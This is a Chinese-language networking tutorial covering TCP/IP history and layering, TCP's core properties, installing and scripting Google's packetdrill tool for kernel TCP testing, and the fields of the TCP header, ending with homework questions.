目前 TCP/IP 协议可以说是名气最大、使用最广泛的计算机网络，从这篇文章来会讲解 TCP 协议的历史和分层模型。将分以下两个部分

- TCP/IP 协议产生的历史背景
- TCP/IP 协议的分层模型

接下来我们来讲讲 TCP/IP 协议的历史。

## TCP/IP 协议产生的历史背景

时间回退到 1969 年，当时的 Internet 还是一个美国国防部高级研究计划局（Advanced Research Projects Agency，ARPA）研究的非常小的网络，被称为 ARPANET（Advanced Research Project Agency Network）。

比较流行的说法是美国担心敌人会摧毁他们的通信网络，于是下决心要建立一个高可用的网络，即使部分线路或者交换机的故障不会导致整个网络的瘫痪。于是 ARPA 建立了著名的 ARPANET。

ARPANET 最早只是一个单个的分组交换网，后来发展成为了多个网络的互联技术，促成了互联网的出现。现代计算机网络的很多理念都来自 ARPANET，1983 年 TCP/IP 协议成为 ARPANET 上的标准协议，使得所有使用 TCP/IP 协议的计算机都能互联，因此人们把 1983 年当做互联网诞生的元年。

从字面上来看，很多人会认为 TCP/IP 是 TCP、IP 这两种协议，实际上TCP/IP 协议族指的是在 IP 协议通信过程中用到的协议的统称

## TCP/IP 网络分层

记得在学习计算机网络课程的时候，一上来就开始讲分层模型了，当时死记硬背的各个层的名字很快就忘光了，不明白到底分层有什么用。纵观计算机和分布式系统，你会发现「计算机的问题都可以通过增加一个虚拟层来解决，如果不行，那就两个」

下面用 wireshark 抓包的方式来开始看网络分层。

打开 wireshark，在弹出的选项中，选中 en0 网卡，在过滤器中输入`host www.baidu.com`，只抓取与百度服务器通信的数据包。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5181c0a6eb2c)



在命令行中用 curl 命令发起 http 请求：`curl http://www.baidu.com`，抓到的中间一次数据包如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5181cb911e12)



可以看到协议的分层从上往下依次是

- Ethernet II：网络接口层以太网帧头部信息
- Internet Protocol Version 4：互联网层 IP 包头部信息
- Transmission Control Protocol：传输层的数据段头部信息，此处是 TCP 协议
- Hypertext Transfer Protocol：应用层 HTTP 的信息



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16dbb2fbdaebd148)



#### 应用层（Application Layer）

应用层的本质是规定了应用程序之间如何相互传递报文， 协议为例，规定了

- 报文的类型，是请求报文还是响应报文
- 报文的语法，报文分为几段，各段是什么含义、用什么分隔，每个部分的每个字段什么什么含义
- 进程应该以什么样的时序发送报文和处理响应报文

很多应用层协议都是由 RFC 文档定义，比如 HTTP 的 RFC 为 [RFC 2616 - Hypertext Transfer Protocol -- HTTP/1.1](https://tools.ietf.org/html/rfc2616)。

HTTP 客户端和 HTTP 服务端的首要工作就是根据 HTTP 协议的标准组装和解析 HTTP 数据包，每个 HTTP 报文格式由三部分组成：

- 起始行（start line），起始行根据是请求报文还是响应报文分为「请求行」和「响应行」。这个例子中起始行是`GET / HTTP/1.1`，表示这是一个 `GET` 请求，请求的 URL 为`/`，协议版本为`HTTP 1.1`，起始行最后会有一个空行`CRLF（\r\n)`与下面的首部分隔开
- 首部（header），首部采用形如`key:value`的方式，比如常见的`User-Agent`、`ETag`、`Content-Length`都属于 HTTP 首部，每个首部直接也是用空行分隔
- 可选的实体（entity），实体是 HTTP 真正要传输的内容，比如下载一个图片文件，传输的一段 HTML等

以本例的请求报文格式为例



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5181c634aed0)



除了我们熟知的 HTTP 协议，还有下面这些非常常用的应用层协议

- 域名解析协议 DNS
- 收发邮件 SMTP 和 POP3 协议
- 时钟同步协议 NTP
- 网络文件共享协议 NFS

#### 传输层（Transport Layer）

传输层的作用是为两台主机之间的「应用进程」提供端到端的逻辑通信，相隔几千公里的两台主机的进程就好像在直接通信一样。

虽然是叫传输层，但是并不是将数据包从一台主机传送到另一台，而是对「传输行为进行控制」，这本小册介绍的主要内容 TCP 协议就被称为传输控制协议（Transmission Control Protocol），为下面两层协议提供数据包的重传、流量控制、拥塞控制等。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5181c55abf06)



假设你正在电脑上用微信跟女朋友聊天，用 QQ 跟技术大佬们讨论技术细节，当电脑收到一个数据包时，它怎么知道这是一条微信的聊天内容，还是一条 QQ 的消息呢？

这就是端口号的作用。传输层用端口号来标识不同的应用程序，主机收到数据包以后根据目标端口号将数据包传递给对应的应用程序进行处理。比如这个例子中，目标端口号为 80，百度的服务器就根据这个目标端口号将请求交给监听 80 端口的应用程序（可能是 Nginx 等负载均衡器）处理



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16dbb1f53dcfd094)



#### 网络互连层（Internet Layer）

网络互连层提供了主机到主机的通信，将传输层产生的的数据包封装成分组数据包发送到目标主机，并提供路由选择的能力



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5181c3ab0eba)



IP 协议是网络层的主要协议，TCP 和 UDP 都是用 IP 协议作为网络层协议。这一层的主要作用是给包加上源地址和目标地址，将数据包传送到目标地址。

IP 协议是一个无连接的协议，也不具备重发机制，这也是 TCP 协议复杂的原因之一就是基于了这样一个「不靠谱」的协议。

#### 网络访问层（Network Access Layer）

网络访问层也有说法叫做网络接口层，以太网、Wifi、蓝牙工作在这一层，网络访问层提供了主机连接到物理网络需要的硬件和相关的协议。这一层我们不做重点讨论。

整体的分层图如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad5182f90d0bb5)



## 分层的好处是什么呢？

分层的本质是通过分离关注点而让复杂问题简单化，通过分层可以做到：

- 各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议
- 灵活性更好：比如路由器不需要应用层和传输层，分层以后路由器就可以只用加载更少的几个协议层
- 易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉
- 能促进标准化：每一层职责清楚，方便进行标准化

## 习题

1. 收到 IP 数据包解析以后，它怎么知道这个分组应该投递到上层的哪一个协议（UDP 或 TCP）

如果要用一句话来描述 TCP 协议，我想应该是：TCP 是一个可靠的（reliable）、面向连接的（connection-oriented）、基于字节流（byte-stream）、全双工的（full-duplex）协议。

## 0x01 TCP 是面向连接的协议

一开始学习 TCP 的时候，我们就被告知 TCP 是面向连接的协议，那什么是面向连接，什么是无连接呢？

- 面向连接（connection-oriented）：面向连接的协议要求正式发送数据之前需要通过「握手」建立一个**逻辑**连接，结束通信时也是通过有序的四次挥手来断开连接。
- 无连接（connectionless）：无连接的协议则不需要

### 三次握手

建立连接的过程是通过「三次握手」来完成的，顾名思义，通过三次数据交换建立一个连接。 通过三次握手协商好双方后续通信的起始序列号、窗口缩放大小等信息。

如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16985bd53967c3b2)



## 0x02 TCP 协议是可靠的

IP 是一种无连接、不可靠的协议：它尽最大可能将数据报从发送者传输给接收者，但并不保证包到达的顺序会与它们被传输的顺序一致，也不保证包是否重复，甚至都不保证包是否会达到接收者。

TCP 要想在 IP 基础上构建可靠的传输层协议，必须有一个复杂的机制来保障可靠性。 主要有下面几个方面：

- 对每个包提供校验和
- 包的序列号解决了接收数据的乱序、重复问题
- 超时重传
- 流量控制、拥塞控制

**校验和（checksum）** 每个 TCP 包首部中都有两字节用来表示校验和，防止在传输过程中有损坏。如果收到一个校验和有差错的报文，TCP 不会发送任何确认直接丢弃它，等待发送端重传。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16dafd4097c7d058)



**包的序列号保证了接收数据的乱序和重复问题** 假设我们往 TCP 套接字里写 3000 字节的数据导致 TCP发送了 3 个数据包，每个数据包大小为 1000 字节：第一个包序列号为[1~1001)，第二个包序列号为 [1001~2001)，第三个包序号为[2001~3001)



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16985bd5397b180a)



假如因为网络的原因导致第二个、第三个包先到接收端，第一个包最后才到，接收端也不会因为他们到达的顺序不一致把包弄错，TCP 会根据他们的序号进行重新的排列然后把结果传递给上层应用程序。

如果 TCP 接收到重复的数据，可能的原因是超时重传了两次但这个包并没有丢失，接收端会收到两次同样的数据，它能够根据包序号丢弃重复的数据。

**超时重传** TCP 发送数据后会启动一个定时器，等待对端确认收到这个数据包。如果在指定的时间内没有收到 ACK 确认，就会重传数据包，然后等待更长时间，如果还没有收到就再重传，在多次重传仍然失败以后，TCP 会放弃这个包。后面我们讲到超时重传模块的时候会详细介绍这部分内容。

**流量控制、拥塞控制** 这部分内容较复杂，后面有专门的文章进行讲解，这里先不展开。

## 0x03 TCP 是面向字节流的协议

TCP 是一种字节流（byte-stream）协议，流的含义是没有固定的报文边界。

假设你调用 2 次 write 函数往 socket 里依次写 500 字节、800 字节。write 函数只是把字节拷贝到内核缓冲区，最终会以多少条报文发送出去是不确定的，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1698a074292fb212)



- 情况 1：分为两条报文依次发出去 500 字节 和 800 字节数据，也有
- 情况 2：两部分数据合并为一个长度为 1300 字节的报文，一次发送
- 情况 3：第一部分的 500 字节与第二部分的 500 字节合并为一个长度为 1000 字节的报文，第二部分剩下的 300 字节单独作为一个报文发送
- 情况 4：第一部分的 400 字节单独发送，剩下100字节与第二部分的 800 字节合并为一个 900 字节的包一起发送。
- 情况 N：还有更多可能的拆分组合

上面出现的情况取决于诸多因素：路径最大传输单元 MTU、发送窗口大小、拥塞窗口大小等。

当接收方从 TCP 套接字读数据时，它是没法得知对方每次写入的字节是多少的。接收端可能分2 次每次 650 字节读取，也有可能先分三次，一次 100 字节，一次 200 字节，一次 1000 字节进行读取。

## 0x04 TCP 是全双工的协议

在 TCP 中发送端和接收端可以是客户端/服务端，也可以是服务器/客户端，通信的双方在任意时刻既可以是接收数据也可以是发送数据，每个方向的数据流都独立管理序列号、滑动窗口大小、MSS 等信息。

## 0x05 小结与思考

TCP 是一个可靠的（reliable）、面向连接的（connection-oriented）、基于字节流（byte-stream）、全双工（full-duplex）的协议。发送端在发送数据以后启动一个定时器，如果超时没有收到对端确认会进行重传，接收端利用序列号对收到的包进行排序、丢弃重复数据，TCP 还提供了流量控制、拥塞控制等机制保证了稳定性。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ad518763d230b6)



留一个思考题，这个题目也是《TCP/IP》详解中的一个习题。

TCP提供了一种字节流服务，而收发双方都不保持记录的边界，应用程序应该如何提供他们自己的记录标识呢？

从大学开始懵懵懂懂粗略学习（死记硬背）了一些 TCP 协议的内容，到工作多年以后，一直没有找到顺手的网络协议栈调试工具，对于纷繁复杂 TCP 协议。业界流行的 scapy 不是很好用，有很多局限性。直到前段时间看到了 Google 开源的 packetdrill，真有一种相见恨晚的感觉。这篇文章讲介绍 packetdrill 的基本原理和用法。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad21e0af9f)



packetdrill 在 2013 年开源，在 Google 内部久经考验，Google 用它发现了 10 余个 Linux 内核 bug，同时用测试驱动开发的方式开发新的网络特性和进行回归测试，确保新功能的添加不影响网络协议栈的可用性。

## 0x01 安装

以 centos7 为例

1. 首先从 github 上 clone 最新的源码 [github.com/google/pack…](https://github.com/google/packetdrill)
2. 进入源码目录`cd gtests/net/packetdrill`
3. 安装 bison和 flex 库：`sudo yum install -y bison flex`
4. 为避免 offload 机制对包大小的影响，修改 netdev.c 注释掉 set_device_offload_flags 函数所有内容
5. 执行 `./configure`
6. 修改 `Makefile`，去掉第一行的末尾的 `-static`
7. 执行 make 命令编译
8. 确认编译无误地生成了 packetdrill 可执行文件

## 0x02 初体验

packetdrill 脚本采用 c 语言和 tcpdump 混合的语法。脚本文件名一般以 .pkt 为后缀，执行脚本的方式为`sudo ./packetdrill test.pkt`

脚本的每一行可以由以下几种类型的语句构成：

- 执行系统调用（system call），对比返回值是否符合预期
- 把数据包（packet）注入到内核协议栈，模拟协议栈收到包
- 比较内核协议栈发出的包与预期是否相符
- 执行 shell 命令
- 执行 python 命令

脚本每一行都有一个时间参数用来表明执行的时间或者预期事件发生的时间，packetdrill 支持绝对时间和相对时间。绝对时间就是一个简单的数字，相对时间会在数字前面添加一个`+`号。比如下面这两个例子

```
// 300ms 时执行 accept 调用
0.300 accept(3, ..., ...) = 4

// 在上一行语句执行结束 10ms 以后执行
+.010 write(4, ..., 1000) = 1000`
```

如果预期的事件在指定的时间没有发生，脚本执行会抛出异常，由于不同机器的响应时间不同，所以 packetdrill 提供了参数（--tolerance_usecs）用来设置误差范围，默认值是 4000us（微秒），也即 4ms。这个参数默认值在 config.c 的 set_default_config 函数里进行设置`config->tolerance_usecs = 4000;`

我们以一个最简单的 demo 来演示 packetdrill 的用法。乍一看很懵，容我慢慢道来

```
  1 0   socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
  2 +0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
  3 +0  bind(3, ..., ...) = 0
  4 +0  listen(3, 1) = 0
  5
  6 //TCP three-way handshake
  7 +0  < S 0:0(0) win 4000 <mss 1000>
  8 +0  > S. 0:0(0) ack 1 <...>
  9 +.1 < . 1:1(0) ack 1 win 1000
 10
 11 +0 accept(3, ..., ...) = 4
 12 +0 < P. 1:201(200) win 4000
 13 +0 > . 1:1(0) ack 201
```

第 1 行：`0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3`

在脚本执行的第 0s 创建一个 socket，使用的是系统调用的方式，socket 函数的签名和用法如下

```
#include <sys/socket.h>
int socket(int domain, int type, int protocol);

成功时返回文件描述符，失败时返回 -1
int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
```

- domain 表示套接字使用的协议族信息，IPv4、IPv6等。AF_INET 表示 IPv4 协议族，AF_INET6 表示 IPv6 协议族。绝大部分使用场景下都是用 AF_INET，即 IPv4 协议族
- type 表示套接字数据传输类型信息，主要分为两种：面向连接的套接字（SOCK_STREAM）和面向无连接报文的套接字（SOCK_DGRAM）。众所周知，SOCK_STREAM 默认协议是 TCP，SOCK_DGRAM 的默认协议是 UDP。
- protocol 这个参数通常是 0，表示为给定的协议族和套接字类型选择默认协议。

在 packetdrill 脚本中用 `...` 来表示当前参数省略不相关的细节信息，使用 packetdrill 程序的默认值。

脚本返回新建的 socket 文件句柄，这里用`=`来断言会返回`3`，因为linux 在每个程序开始的时刻，都会有 3 个已经打开的文件句柄，分别是：标准输入stdin(0)、标准输出stdout(1)、错误输出stderr(2) 默认的，其它新建的文件句柄则排在之后，从 3 开始。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad1a156295)



```
2 +0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
3 +0  bind(3, ..., ...) = 0
4 +0  listen(3, 1) = 0
```

- 第 2 行：调用 setsockopt 函数设置端口重用。
- 第 3 行：调用 bind 函数，这里的 socket 地址省略会使用默认的端口 8080，第一个参数 3 是套接字的 fd
- 第 4 行：调用 listen 函数，第一个参数 3 也是套接字 fd 到此为止，socket 已经可以接受客户端的 tcp 连接了。

第 7 ~ 9 行是经典的三次握手，packetdrill 的语法非常类似 tcpdump 的语法

`<` 表示输入的数据包（input packets)， packetdrill 会构造一个真实的数据包，注入到内核协议栈。比如：

```
// 构造 SYN 包注入到协议栈
+0  < S 0:0(0) win 32792 <mss 1000,sackOK,nop,nop,nop,wscale 7>

// 构造 icmp echo_reply 包注入到协议栈
0.400 < icmp echo_reply
```

`>` 表示预期协议栈会响应的包（outbound packets），这个包不是 packetdrill 构造的，是由协议栈发出的，packetdrill 会检查协议栈是不是真的发出了这个包，如果没有，则脚本报错停止执行。比如

```
// 调用 write 函数调用以后，检查协议栈是否真正发出了 PSH+ACK 包
+0  write(4, ..., 1000) = 1000
+0  > P. 1:1001(1000) ack 1

// 三次握手中过程向协议栈注入 SYN 包以后，检查协议栈是否发出了 SYN+ACK 包以及 ack 是否等于 1
0.100 < S 0:0(0) win 32792 <mss 1000,nop,wscale 7>
0.100 > S. 0:0(0) ack 1 <mss 1460,nop,wscale 6>
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad15d16381)



第 7 行：`+0 < S 0:0(0) win 1000 `

packetdrill 构造一个 SYN 包发送到协议栈，它使用与 tcpdump 类似的相对 sequence 序号，S 后面的三个 0 ，分别表示发送包的起始 seq、结束 seq、包的长度。比如`P. 1:1001(1000)`表示发送的包起始序号为 1，结束 seq 为 1001，长度为1000。紧随其后的 win 表示发送端的接收窗口大小 1000。依据 TCP 协议，SYN 包也必须带上自身的 MSS 选项，这里的 MSS 大小为 1000

第 8 行：`+0 > S. 0:0(0) ack 1 <...>`

预期协议栈会立刻回复 SYN+ACK 包，因为还没有发送数据，所以包的 seq开始值、结束值、长度都为 0，ack 为上次 seq + 1，表示第一个 SYN 包已收到。

> 第 9 行：`+.1 < . 1:1(0) ack 1 win 1000`

0.1s 以后注入一个 ACK 包到协议栈，没有携带数据，包的长度为 0，至此三次握手完成，过程如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad15f09bbf)



`+0 accept(3, ..., ...) = 4` accept 系统调用返回了一个值为 4 的新的文件 fd，这时 packetdrill 可以往这个 fd 里面写数据了

```
+0 write(4, ..., 10)=10
+0 > P. 1:11(10) ack 1
+.1 < . 1:1(0) ack 11 win 1000
```

packetdrill 调用 write 函数往 socket 里写了 10 字节的数据，协议栈立刻发出这 10 个字节数据包，同时把 PSH 标记置为 1。这个包的起始 seq 为 1，结束 seq 为 10，长度为 10。100ms 以后注入 ACK 包，模拟协议栈收到 ACK 包。

整个过程如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad1855b751)



采用 tcpdump 对 8080 端口进行抓包，结果如下

```
sudo tcpdump -i any port 8080 -nn                                                                                                                                                                   
10:02:36.591911 IP 192.0.2.1.37786 > 192.168.31.139.8080: Flags [S], seq 0, win 4000, options [mss 1000], length 0
10:02:36.591961 IP 192.168.31.139.8080 > 192.0.2.1.37786: Flags [S.], seq 2327356581, ack 1, win 29200, options [mss 1460], length 0
10:02:36.693785 IP 192.0.2.1.37786 > 192.168.31.139.8080: Flags [.], ack 1, win 1000, length 0
10:02:36.693926 IP 192.168.31.139.8080 > 192.0.2.1.37786: Flags [P.], seq 1:11, ack 1, win 29200, length 10
10:02:36.801092 IP 192.0.2.1.37786 > 192.168.31.139.8080: Flags [.], ack 11, win 1000, length 0
```

## 0x03 packetdrill 原理简述

在脚本的最后一行，加上

```
+0 `sleep 1000000`
```

让脚本执行完不要退出，执行 ifconfig 可以看到，比没有执行脚本之前多了一个虚拟的网卡 tun0。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918dad1a9ae238)



packetdrill 就是在执行脚本前创建了一个名为 tun0 的虚拟网卡，脚本执行完，tun0 会被销毁。该虚拟网卡对应于操作系统中`/dev/net/tun`文件，每次程序通过 write 等系统调用将数据写入到这个文件 fd 时，这些数据会经过 tun0 这个虚拟网卡，将数据写入到内核协议栈，read 系统调用读取数据的过程类似。协议栈可以向操作普通网卡一样操作虚拟网卡 tun0。

关于 linux 下 tun 的详细使用介绍，可以参考 IBM 的文章 [www.ibm.com/developerwo…](https://www.ibm.com/developerworks/cn/linux/l-tuntap/index.html)

## 0x04 把 packetdrill 命令加到环境变量里

把 packetdrill 加入到环境变量里以便于可以在任意目录可以执行。第一步是修改`/etc/profile`或者`.zshrc`（如果你用的是最好用的 zsh 的话）等可以修改环境变量的文件。

```
export PATH=/path_to_packetdrill/:$PATH

source ~/.zshrc
```

在命令行中输入 packetdrill 如果有输出 packetdrill 的 usage 文档说明第一步成功啦。

但是 packetdrill 命令是需要 sudo 权限执行的，如果现在我们在命令行中输入`sudo packetdrill`，会提示找不到 packetdrill 命令

```
sudo：packetdrill：找不到命令
```

这是因为 sudo 命令为了安全性的考虑，覆盖了用户自己 PATH 环境变量，我们可以用`sudo sudo -V | grep PATH` 来看

```
sudo sudo -V | grep  PATH                                                                                                                                  
覆盖用户的 $PATH 变量的值：/sbin:/bin:/usr/sbin:/usr/bin
```

可以看到 sudo 命令覆盖了用户的 PATH 变量。这些初始值是在`/etc/sudoers`中定义的

```
sudo cat /etc/sudoers | grep -i PATH                                                                                                                          
Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin
```

一个最简单的办法是在sudo 启动时重新赋值它的 PATH 变量：`sudo env PATH="$PATH" cmd_x`，可以用`sudo env PATH="$PATH" env | grep PATH`与`sudo env | grep PATH`做前后对比



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a8fc67c4be0c8b)



对于本文中的 packetdrill，可以用`sudo env PATH=$PATH packetdrill delay_ack.pkt`来执行，当然你可以做一个 sudo 的 alias

```
alias sudo='sudo env PATH="$PATH"'
```

这样就可以在任意地方执行`sudo packetdrill`了

## 0x05 小结

packetdrill 上手的难度有一点大，但是熟悉了以后用起来特别顺手，后面很多 TCP 包超时重传、快速重传、滑动窗口、nagle 算法都是会用这个工具来进行测试，希望你可以熟练掌握。

这篇文章来讲讲 TCP 报文首部相关的概念，这些头部是支撑 TCP 复杂功能的基石。 完整的 TCP 头部如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d702629b61cbcc)



我们用一次访问百度网页抓包的例子来开始。

```
curl -v www.baidu.com
```

完整的抓包文件可以来 github 下载：[curl_baidu.pcapng](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_header/curl_baidu.pcapng)



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d702629babb3f6)



## 源端口号、目标端口号

在第一个包的详情中，首先看到的高亮部分的源端口号（Src Port）和目标端口号（Dst Port)，这个例子中本地源端口号为 61024，百度目标端口号是 80。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70262f5e8a192)



TCP 报文头部里没有源 ip 和目标 ip 地址，只有源端口号和目标端口号

这也是初学 wireshark 抓包时很多人会有的一个疑问：过滤 ip 地址为 172.19.214.24 包的条件为什么不是 "tcp.addr == 172.19.214.24"，而是 "ip.addr == 172.19.214.2"

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70262f65563ce)



TCP 的报文里是没有源 ip 和目标 ip 的，因为那是 IP 层协议的事情，TCP 层只有源端口和目标端口。

源 IP、源端口、目标 IP、目标端口构成了 TCP 连接的「四元组」。一个四元组可以唯一标识一个连接。

后面文章中专门有一节是用来介绍端口号相关的知识。

------

接下来，我们看到的是序列号，如截图中 2 的标识。

## 序列号（Sequence number）

TCP 是面向字节流的协议，通过 TCP 传输的字节流的每个字节都分配了序列号，序列号（Sequence number）指的是本报文段第一个字节的序列号。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70262f7fb618a)



序列号加上报文的长度，就可以确定传输的是哪一段数据。序列号是一个 32 位的无符号整数，达到 2^32-1 后循环到 0。

在 SYN 报文中，序列号用于交换彼此的初始序列号，在其它报文中，序列号用于保证包的顺序。

因为网络层（IP 层）不保证包的顺序，TCP 协议利用序列号来解决网络包乱序、重复的问题，以保证数据包以正确的顺序组装传递给上层应用。

如果发送方发送的是四个报文序列号分别是1、2、3、4，但到达接收方的顺序是 2、4、3、1，接收方就可以通过序列号的大小顺序组装出原始的数据。

### 初始序列号（Initial Sequence Number, ISN）

在建立连接之初，通信双方都会各自选择一个序列号，称之为初始序列号。在建立连接时，通信双方通过 SYN 报文交换彼此的 ISN，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70264eaa6828c)



初始建立连接的过程中 SYN 报文交换过程如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70264ef144241)



其中第 2 步和第 3 步可以合并一起，这就是三次握手的过程



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70264f4692792)



------

## 确认号



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70265e2c9f7c0)



TCP 使用确认号（Acknowledgment number, ACK）来告知对方下一个期望接收的序列号，小于此确认号的所有字节都已经收到。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70265e3d247b3)



关于确认号有几个注意点：

- 不是所有的包都需要确认的
- 不是收到了数据包就立马需要确认的，可以延迟一会再确认
- ACK 包本身不需要被确认，否则就会无穷无尽死循环了
- 确认号永远是表示小于此确认号的字节都已经收到

## TCP Flags

TCP 有很多种标记，有些用来发起连接同步初始序列号，有些用来确认数据包，还有些用来结束连接。TCP 定义了一个 8 位的字段用来表示 flags，大部分都只用到了后 6 个，如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70265e3ed0a23)



下面这个是 wireshark 第一个 SYN 包的 flags 截图

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266d81f6e83)



我们通常所说的 SYN、ACK、FIN、RST 其实只是把 flags 对应的 bit 位置为 1 而已，这些标记可以组合使用，比如 SYN+ACK，FIN+ACK 等

最常见的有下面这几个：

- SYN（Synchronize）：用于发起连接数据包同步双方的初始序列号
- ACK（Acknowledge）：确认数据包
- RST（Reset）：这个标记用来强制断开连接，通常是之前建立的连接已经不在了、包不合法、或者实在无能为力处理
- FIN（Finish）：通知对方我发完了所有数据，准备断开连接，后面我不会再发数据包给你了。
- PSH（Push）：告知对方这些数据包收到以后应该马上交给上层应用，不能缓存起来

## 窗口大小



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266d82aaebd)



可以看到用于表示窗口大小的"Window Size" 只有 16 位，可能 TCP 协议设计者们认为 16 位的窗口大小已经够用了，也就是最大窗口大小是 65535 字节（64KB）。就像网传盖茨曾经说过：“640K内存对于任何人来说都足够了”一样。

自己挖的坑当然要自己填，因此TCP 协议引入了「TCP 窗口缩放」选项 作为窗口缩放的比例因子，比例因子值的范围是 0 ~ 14，其中最小值 0 表示不缩放，最大值 14。比例因子可以将窗口扩大到原来的 2 的 n 次方，比如窗口大小缩放前为 1050，缩放因子为 7，则真正的窗口大小为 1050 * 128 = 134400，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266db317004)



在 wireshark 中最终的窗口大小会自动计算出来，如下图中的 Calculated window size。以本文中抓包的例子为例



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266f7f45c6b)



值得注意的是，窗口缩放值在三次握手的时候指定，如果抓包的时候没有抓到 SYN 包，wireshark 是不知道真正的窗口缩放值是多少的。

## 可选项



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266f7d32a0f)



可选项的格式入下所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d70266f820427e)



以 MSS 为例，kind=2，length=4，value=1460



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d7026733bbfa60)



常用的选项有以下几个：

- MSS：最大段大小选项，是 TCP 允许的从对方接收的最大报文段
- SACK：选择确认选项
- Window Scale：窗口缩放选项

## 作业题

1、如果一个 TCP 连接正在传送 5000 字节的数据，第一个字节的序号是 10001，数据被分为 5 段，每个段携带 1000 字节，请问每个段的序号是什么？

2、A B 两个主机之间建立了一个 TCP 连接，A 主机发给 B 主机两个 TCP 报文，大小分别是 500 和 300，第一个报文的序列号是 200，那么 B 主机接收两个报文后，返回的确认号是（）

- A、200
- B、700
- C、800
- D、1000

3、客户端的使用 ISN=2000 打开一个连接，服务器端使用 ISN=3000 打开一个连接，经过 3 次握手建立连接。连接建立起来以后，假定客户端向服务器发送一段数据`Welcome the server!`（长度 20 Bytes），而服务器的回答数据`Thank you!`（长度 10 Bytes ），试画出三次握手和数据传输阶段报文段序列号、确认号的情况。
